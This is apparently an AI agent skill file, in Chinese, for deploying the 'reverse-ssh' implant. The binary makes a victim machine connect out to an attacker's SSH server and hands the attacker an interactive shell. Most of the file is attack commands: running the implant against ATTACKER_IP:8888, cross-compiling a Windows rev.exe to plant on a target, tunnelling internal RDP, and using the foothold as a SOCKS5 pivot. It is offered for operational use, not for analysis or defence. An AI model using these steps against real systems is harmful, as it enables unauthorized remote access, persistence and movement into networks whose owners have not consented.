---
name: reverse-ssh
description: >
  此技能适用于用户询问关于 "reverse-ssh"、"目标不可直接访问，需要通过仅出站连接建立稳定 SSH shell" 等内容。从受害者向攻击者建立反向 SSH 隧道，实现 NAT/防火墙后的交互式 shell 访问。
---

# Reverse-SSH

反向 SSH 隧道植入体 —— 通过出站连接建立 SSH shell，无需端口转发。

## 快速开始

```bash
# 攻击者：启动 SSH 服务器（任意标准 SSH 服务器）
# 默认：在攻击者端口 8888 上监听

# 受害者：运行 reverse-ssh 二进制文件
./reverse-ssh <attacker_ip>:<port>

# 攻击者：反向连接
ssh -p 8888 localhost          # 与受害者 shell 交互
# 或列出已连接的会话
ssh -p 8888 127.0.0.1 ls
```

## 常用参数

| 参数 | 用途 |
|------|------|
| `-p PORT` | 受害者本地绑定端口 |
| `--ssh-port N` | 攻击者 SSH 服务器端口 |
| `-l USER` | 登录用户 |
| `--socks5` | 启用 SOCKS5 代理 |
| `--foreground` | 不后台化（不守护进程） |

## 常用工作流程

**部署反向 shell：**
```bash
# 为 Windows 目标交叉编译（在 Linux 上）
GOOS=windows GOARCH=amd64 go build -o rev.exe .
# 传输到受害者并执行：
rev.exe ATTACKER_IP:8888
```

**通过反向 SSH 进行端口转发：**
```bash
# 在攻击者端隧道内网 RDP
ssh -p 8888 -L 3389:127.0.0.1:3389 localhost
# 将 RDP 客户端连接到 localhost:3389
```

**SOCKS5 代理：**
```bash
./reverse-ssh --socks5 ATTACKER:8888
# 使用 -D 参数建立 SOCKS 隧道
ssh -p 8888 -D 1080 localhost
```

## 资源

| 文件 | 加载时机 |
|------|----------|
| `references/` | 持久化与交叉编译说明 |
